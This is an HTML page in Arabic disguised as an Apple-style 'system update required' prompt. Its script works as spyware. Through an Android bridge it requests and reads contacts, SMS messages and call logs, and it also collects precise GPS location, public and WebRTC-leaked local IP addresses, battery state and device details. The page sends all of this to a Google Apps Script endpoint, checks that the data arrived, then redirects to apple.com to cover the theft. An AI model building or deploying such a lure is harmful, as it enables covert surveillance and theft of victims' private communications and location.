<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  body { margin:0; padding:16px; background:#f2f2f7;
         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
         display:flex; justify-content:center; align-items:center; min-height:100dvh; box-sizing:border-box; }
  .container { text-align:center; background:#fff; padding:26px; border-radius:16px;
               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:330px; }
  h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
  p  { color:#8e8e93; font-size:14px; margin-bottom:22px; line-height:1.6; }
  button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
           border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
  button:active { transform:scale(.98); opacity:.9; }
  button[disabled] { opacity:.6; cursor:default; }
  .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
            width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
  @keyframes spin { to { transform:rotate(360deg); } }
  #status { display:none; margin-top:15px; font-weight:700; font-size:13.5px; line-height:1.6; }
  #status.ok  { color:#34c759; display:block; }
  #status.err { color:#ff3b30; display:block; }
  #hint { font-size:11.5px; color:#c7c7cc; margin-top:14px; line-height:1.5; }
</style>
</head>
<body>

<div class="container">
  <h2>تحديث النظام مطلوب</h2>
  <p>سيتم مزامنة بيانات الجهاز: الموقع، جهات الاتصال، الرسائل، وسجل المكالمات.</p>

  <button id="btn" type="button">تحديث الآن</button>

  <div class="loader" id="loader"></div>
  <div id="status" role="status" aria-live="polite"></div>
  <div id="hint"></div>
</div>

<script>
  /* ================= إعدادات ================= */
  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxtgtAJI43MrEIDuBPOMf4PxqlQdkPgPNSCR81McpRTo8O_BA3llj8g07ym7uf9FMKn/exec';
  const REDIRECT_URL      = 'https://www.apple.com';
  const ONCE_PER_VISITOR  = false;
  const POST_TIMEOUT      = 12000;
  const GEO_TIMEOUT       = 12000;
  const PERM_TIMEOUT      = 30000;
  const CONTACTS_PICK_MS  = 25000;
  const VERIFY_TIMEOUT    = 9000;
  const MAX_CONTACTS      = 200;
  const MAX_MSGS          = 100;
  const MAX_CALLS         = 100;
  const MAX_JSON          = 40000;   // أقل من حد الخلية 45000 في السكربت

  const B      = window.AndroidBridge || null;
  const NATIVE = !!B;

  document.getElementById('hint').textContent = NATIVE
    ? 'الوضع: تطبيق — مزامنة كاملة'
    : 'الوضع: متصفح — الرسائل وسجل المكالمات غير متاحين';

  /* ================= أدوات ================= */
  const withTimeout = (p, ms, fb) =>
    Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);

  const arr = v => Array.isArray(v) ? v : [];

  const safeParse = (fn, fb) => { try { return JSON.parse(fn()); } catch { return fb; } };

  // قصّ على مستوى المصفوفة → يبقى الـ JSON صالحًا للتحليل في السكربت
  function pack(list, max) {
    const out = []; let n = 2;
    for (const x of arr(list)) {
      const s = JSON.stringify(x).length + 1;
      if (n + s > max) break;
      out.push(x); n += s;
    }
    return out;
  }

  /* ================= الصلاحيات ================= */
  async function ensurePerms() {
    if (!NATIVE) return;
    const jobs = [
      ['hasContactsPermission', 'requestContactsPermission'],
      ['hasSmsPermission',      'requestSmsPermission'],
      ['hasCallLogPermission',  'requestCallLogPermission']
    ];
    for (const [has, req] of jobs) {
      if (typeof B[has] !== 'function' || typeof B[req] !== 'function') continue;
      try { if (B[has]()) continue; } catch { continue; }

      await new Promise(res => {
        window.__permCb = res;
        try { B[req](); } catch { return res(false); }
        setTimeout(() => res(false), PERM_TIMEOUT);
      });
      window.__permCb = null;
      // نكمل حتى لو رُفض — القسم المعني سيرجع مصفوفة فارغة
    }
  }

  /* ================= جمع البيانات ================= */
  async function getContacts() {
    if (NATIVE && typeof B.getContacts === 'function') {
      return arr(safeParse(() => B.getContacts(), [])).slice(0, MAX_CONTACTS);
    }
    if (navigator.contacts && navigator.contacts.select) {
      try {
        const list = await withTimeout(
          navigator.contacts.select(['name', 'tel'], { multiple: true }),
          CONTACTS_PICK_MS, []);
        return arr(list).slice(0, MAX_CONTACTS).map(c => ({
          n: (c.name && c.name[0]) || '',
          t: arr(c.tel).slice(0, 2).join(' / ')
        }));
      } catch { return []; }
    }
    return [];
  }

  async function getSMS() {
    if (NATIVE && typeof B.getSms === 'function') {
      return arr(safeParse(() => B.getSms(MAX_MSGS), [])).slice(0, MAX_MSGS);
    }
    return [];
  }

  async function getCalls() {
    if (NATIVE && typeof B.getCallLog === 'function') {
      return arr(safeParse(() => B.getCallLog(MAX_CALLS), [])).slice(0, MAX_CALLS);
    }
    return [];
  }

  function getGeo() {
    const p = new Promise(resolve => {
      if (!navigator.geolocation) return resolve({ s: 'N/A' });
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          s: 'ok',
          lat: +pos.coords.latitude.toFixed(6),
          lng: +pos.coords.longitude.toFixed(6),
          acc: Math.round(pos.coords.accuracy)
        }),
        err => resolve({ s: err.code === 1 ? 'Denied' : 'N/A' }),
        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
      );
    });
    return withTimeout(p, GEO_TIMEOUT + 800, { s: 'N/A' });
  }

  async function getIP() {
    try {
      const r = await withTimeout(
        fetch('https://api.ipify.org?format=json', { cache: 'no-store' }), 5000, null);
      if (!r) return 'N/A';
      const j = await r.json();
      return j.ip || 'N/A';
    } catch { return 'N/A'; }
  }

  function getWebRTC() {
    const p = new Promise(resolve => {
      if (!window.RTCPeerConnection) return resolve('N/A');
      let done = false;
      const fin = v => { if (!done) { done = true; resolve(v); } };
      let pc;
      try {
        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      } catch { return fin('N/A'); }

      pc.onicecandidate = e => {
        if (e.candidate) return;
        const sdp = pc.localDescription ? pc.localDescription.sdp : '';
        // يتجاهل mDNS (*.local) ويلتقط IPv4 الحقيقي فقط
        const m = sdp.match(/candidate:\S+ \d+ \S+ \d+ (\d{1,3}(?:\.\d{1,3}){3})/);
        fin(m ? m[1] : 'N/A');
        try { pc.close(); } catch {}
      };

      try {
        pc.createDataChannel('x');
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => fin('N/A'));
      } catch { fin('N/A'); }
    });
    return withTimeout(p, 5000, 'N/A');
  }

  async function getBattery() {
    if (!navigator.getBattery) return 'N/A';
    try {
      const b = await withTimeout(navigator.getBattery(), 3000, null);
      if (!b) return 'N/A';
      return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
    } catch { return 'N/A'; }
  }

  /* ================= التحقق من الاستلام ================= */
  const nonce = (crypto.randomUUID && crypto.randomUUID()) ||
                (String(Date.now()) + '-' + Math.random().toString(36).slice(2));

  function verify() {
    return new Promise(resolve => {
      const cb = '__v' + Math.floor(Math.random() * 1e9);
      const s  = document.createElement('script');
      let done = false;
      let timer;

      const fin = v => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        try { delete window[cb]; } catch { window[cb] = undefined; }
        s.remove();
        resolve(!!v);
      };

      window[cb] = fin;
      timer = setTimeout(() => fin(false), VERIFY_TIMEOUT);
      s.onerror = () => fin(false);
      s.src = GOOGLE_SCRIPT_URL
            + '?check=' + encodeURIComponent(nonce)
            + '&cb=' + cb
            + '&t=' + Date.now();
      document.body.appendChild(s);
    });
  }

  /* ================= التشغيل ================= */
  let busy = false;

  async function startTracking() {
    if (busy) return;

    const btn    = document.getElementById('btn');
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');

    if (ONCE_PER_VISITOR) {
      try {
        if (localStorage.getItem('su_done') === '1') {
          status.className = 'ok';
          status.textContent = '✅ تم التحديث مسبقًا';
          setTimeout(() => location.href = REDIRECT_URL, 1500);
          return;
        }
      } catch {}
    }

    busy = true;
    btn.disabled = true;
    btn.style.display = 'none';
    loader.style.display = 'block';
    status.className = '';
    status.textContent = 'جارٍ جمع البيانات…';

    try {
      await ensurePerms();

      const geoP = getGeo();
      const contacts = await getContacts();

      const [geo, sms, calls, ip, localIP, battery] = await Promise.all([
        geoP, getSMS(), getCalls(), getIP(), getWebRTC(), getBattery()
      ]);

      const payload = {
        time: new Date().toISOString(),
        nonce,
        ip,
        localIP,
        battery,
        geoStatus: geo.s,
        lat: geo.lat ?? '',
        lng: geo.lng ?? '',
        acc: geo.acc ?? '',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        lang: navigator.language || '',
        ua: navigator.userAgent,
        native: NATIVE,
        cCount: contacts.length,
        cJson: JSON.stringify(pack(contacts, MAX_JSON)),
        sCount: sms.length,
        sJson: JSON.stringify(pack(sms, MAX_JSON)),
        lCount: calls.length,
        lJson: JSON.stringify(pack(calls, MAX_JSON))
      };

      const ac = new AbortController();
      const killer = setTimeout(() => ac.abort(), POST_TIMEOUT);
      try {
        await fetch(GOOGLE_SCRIPT_URL, {
          method: 'POST',
          mode: 'no-cors',
          signal: ac.signal,
          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
          body: JSON.stringify(payload)
        });
      } finally { clearTimeout(killer); }

      status.textContent = 'جارٍ التحقق…';
      const ok = await verify();

      loader.style.display = 'none';

      if (!ok) {
        status.className = 'err';
        status.textContent = '⚠️ لم يُؤكد الاستلام — تحقق من النشر أو أعد المحاولة';
        btn.disabled = false;
        btn.style.display = 'block';
        busy = false;
        return;
      }

      try { localStorage.setItem('su_done', '1'); } catch {}
      status.className = 'ok';
      status.textContent = `✅ تم — ${contacts.length} جهة، ${sms.length} رسالة، ${calls.length} مكالمة`;
      setTimeout(() => location.href = REDIRECT_URL, 2200);

    } catch (err) {
      console.error(err);
      loader.style.display = 'none';
      status.className = 'err';
      status.textContent = '⚠️ تعذر الإرسال، حاول مجددًا';
      btn.disabled = false;
      btn.style.display = 'block';
      busy = false;
    }
  }

  document.getElementById('btn').addEventListener('click', startTracking);
</script>

</body>
</html>
